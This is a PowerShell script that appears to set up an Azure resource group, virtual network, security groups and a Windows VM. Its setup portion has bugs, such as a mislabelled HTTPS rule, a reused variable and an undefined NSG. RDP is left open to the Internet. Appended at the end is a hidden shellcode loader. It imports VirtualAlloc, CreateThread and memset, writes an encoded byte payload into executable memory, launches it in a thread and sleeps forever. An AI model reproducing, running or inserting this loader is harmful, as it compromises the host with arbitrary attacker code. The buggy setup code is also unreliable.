
 -||-> $rgName='MyResourceGroup' <-||- 
 -||-> $location='eastus' <-||- 


 -||-> $cred =  -||-> Get-Credential -Message 'Enter a username and password for the virtual machine.' <-||-  <-||- 


 -||-> New-AzResourceGroup -Name $rgName -Location $location <-||- 


 -||-> $fesubnet =  -||-> New-AzVirtualNetworkSubnetConfig -Name 'MySubnet-FrontEnd' -AddressPrefix '10.0.1.0/24' <-||-  <-||- 
 -||-> $besubnet =  -||-> New-AzVirtualNetworkSubnetConfig -Name 'MySubnet-BackEnd' -AddressPrefix '10.0.2.0/24' <-||-  <-||- 
 -||-> $vnet =  -||-> New-AzVirtualNetwork -ResourceGroupName $rgName -Name 'MyVnet' -AddressPrefix '10.0.0.0/16' `
  -Location $location -Subnet $fesubnet, $besubnet <-||-  <-||- 


 -||-> $rule1 =  -||-> New-AzNetworkSecurityRuleConfig -Name 'Allow-HTTP-ALL' -Description 'Allow HTTP' `
  -Access Allow -Protocol Tcp -Direction Inbound -Priority 100 `
  -SourceAddressPrefix Internet -SourcePortRange * `
  -DestinationAddressPrefix * -DestinationPortRange 80 <-||-  <-||- 

 -||-> $rule2 =  -||-> New-AzNetworkSecurityRuleConfig -Name 'Allow-HTTPS-All' -Description 'Allow HTTPS' `
  -Access Allow -Protocol Tcp -Direction Inbound -Priority 200 `
  -SourceAddressPrefix Internet -SourcePortRange * `
  -DestinationAddressPrefix * -DestinationPortRange 80 <-||-  <-||- 


 -||-> $rule2 =  -||-> New-AzNetworkSecurityRuleConfig -Name 'Allow-RDP-All' -Description "Allow RDP" `
  -Access Allow -Protocol Tcp -Direction Inbound -Priority 300 `
  -SourceAddressPrefix Internet -SourcePortRange * `
  -DestinationAddressPrefix * -DestinationPortRange 3389 <-||-  <-||- 


 -||-> $nsg =  -||-> New-AzNetworkSecurityGroup -ResourceGroupName $RgName -Location $location `
  -Name "MyNsg-FrontEnd" -SecurityRules $rule1,$rule2,$rule3 <-||-  <-||- 


 -||-> Set-AzVirtualNetworkSubnetConfig -VirtualNetwork $vnet -Name 'MySubnet-FrontEnd' `
  -AddressPrefix 10.0.1.0/24 -NetworkSecurityGroup $nsgfe <-||- 


 -||-> $rule1 =  -||-> New-AzNetworkSecurityRuleConfig -Name 'Deny-Internet-All' -Description 'Deny Internet All' `
  -Access Deny -Protocol Tcp -Direction Outbound -Priority 300 `
  -SourceAddressPrefix * -SourcePortRange * `
  -DestinationAddressPrefix * -DestinationPortRange * <-||-  <-||- 


 -||-> $nsgbe =  -||-> New-AzNetworkSecurityGroup -ResourceGroupName $RgName -Location $location `
  -Name 'MyNsg-BackEnd' -SecurityRules $rule1 <-||-  <-||- 


 -||-> Set-AzVirtualNetworkSubnetConfig -VirtualNetwork $vnet -Name 'MySubnet-BackEnd' `
  -AddressPrefix 10.0.2.0/24 -NetworkSecurityGroup $nsgbe <-||- 


 -||-> $publicipvm =  -||-> New-AzPublicIpAddress -ResourceGroupName $rgName -Name 'MyPublicIp-FrontEnd' `
  -location $location -AllocationMethod Dynamic <-||-  <-||- 



 -||-> $nicVMfe =  -||-> New-AzNetworkInterface -ResourceGroupName $rgName -Location $location `
  -Name 'MyNic-FrontEnd' -PublicIpAddress $publicipvm -Subnet $vnet.Subnets[0] <-||-  <-||- 


 -||-> $nicVMbe =  -||-> New-AzNetworkInterface -ResourceGroupName $rgName -Location $location `
  -Name 'MyNic-BackEnd' -Subnet $vnet.Subnets[1] <-||-  <-||- 


 -||-> $vmConfig =  -||-> New-AzVMConfig -VMName 'MyVm' -VMSize 'Standard_DS2' | `
  Set-AzVMOperatingSystem -Windows -ComputerName 'MyVm' -Credential $cred | `
  Set-AzVMSourceImage -PublisherName 'MicrosoftWindowsServer' -Offer 'WindowsServer' `
  -Skus '2016-Datacenter' -Version 'latest' <-||-  <-||- 
    
 -||-> $vmconfig =  -||-> Add-AzVMNetworkInterface -VM $vmConfig -id $nicVMfe.Id -Primary <-||-  <-||- 
 -||-> $vmconfig =  -||-> Add-AzVMNetworkInterface -VM $vmConfig -id $nicVMbe.Id <-||-  <-||- 


 -||-> $vm =  -||-> New-AzVM -ResourceGroupName $rgName -Location $location -VM $vmConfig <-||-  <-||- 


 -||-> $KUo = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $KUo -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xc9,0xba,0xd1,0x03,0x54,0x3c,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x2d,0xe1,0xa1,0xc0,0x25,0x64,0x49,0x39,0xb5,0x09,0xc3,0xdc,0x84,0x09,0xb7,0x95,0xb6,0xb9,0xb3,0xf8,0x3a,0x31,0x91,0xe8,0xc9,0x37,0x3e,0x1e,0x7a,0xfd,0x18,0x11,0x7b,0xae,0x59,0x30,0xff,0xad,0x8d,0x92,0x3e,0x7e,0xc0,0xd3,0x07,0x63,0x29,0x81,0xd0,0xef,0x9c,0x36,0x55,0xa5,0x1c,0xbc,0x25,0x2b,0x25,0x21,0xfd,0x4a,0x04,0xf4,0x76,0x15,0x86,0xf6,0x5b,0x2d,0x8f,0xe0,0xb8,0x08,0x59,0x9a,0x0a,0xe6,0x58,0x4a,0x43,0x07,0xf6,0xb3,0x6c,0xfa,0x06,0xf3,0x4a,0xe5,0x7c,0x0d,0xa9,0x98,0x86,0xca,0xd0,0x46,0x02,0xc9,0x72,0x0c,0xb4,0x35,0x83,0xc1,0x23,0xbd,0x8f,0xae,0x20,0x99,0x93,0x31,0xe4,0x91,0xaf,0xba,0x0b,0x76,0x26,0xf8,0x2f,0x52,0x63,0x5a,0x51,0xc3,0xc9,0x0d,0x6e,0x13,0xb2,0xf2,0xca,0x5f,0x5e,0xe6,0x66,0x02,0x36,0xcb,0x4a,0xbd,0xc6,0x43,0xdc,0xce,0xf4,0xcc,0x76,0x59,0xb4,0x85,0x50,0x9e,0xbb,0xbf,0x25,0x30,0x42,0x40,0x56,0x18,0x80,0x14,0x06,0x32,0x21,0x15,0xcd,0xc2,0xce,0xc0,0x78,0xc6,0x58,0x52,0x16,0xb0,0x2e,0xcc,0xe5,0x40,0x47,0xec,0x63,0xa6,0x07,0xbe,0x23,0x77,0xe7,0x6e,0x84,0x27,0x8f,0x64,0x0b,0x17,0xaf,0x86,0xc1,0x30,0x45,0x69,0xbc,0x69,0xf1,0x10,0xe5,0xe2,0x60,0xdc,0x33,0x8f,0xa2,0x56,0xb0,0x6f,0x6c,0x9f,0xbd,0x63,0x18,0x6f,0x88,0xde,0x8e,0x70,0x26,0x74,0x2e,0xe5,0xcd,0xdf,0x79,0x91,0xcf,0x06,0x4d,0x3e,0x2f,0x6d,0xc6,0xf7,0xa5,0xce,0xb0,0xf7,0x29,0xcf,0x40,0xae,0x23,0xcf,0x28,0x16,0x10,0x9c,0x4d,0x59,0x8d,0xb0,0xde,0xcc,0x2e,0xe1,0xb3,0x47,0x47,0x0f,0xea,0xa0,0xc8,0xf0,0xd9,0x30,0x34,0x27,0x27,0x47,0x54,0xfb <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $sR4=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $sR4.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$sR4,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



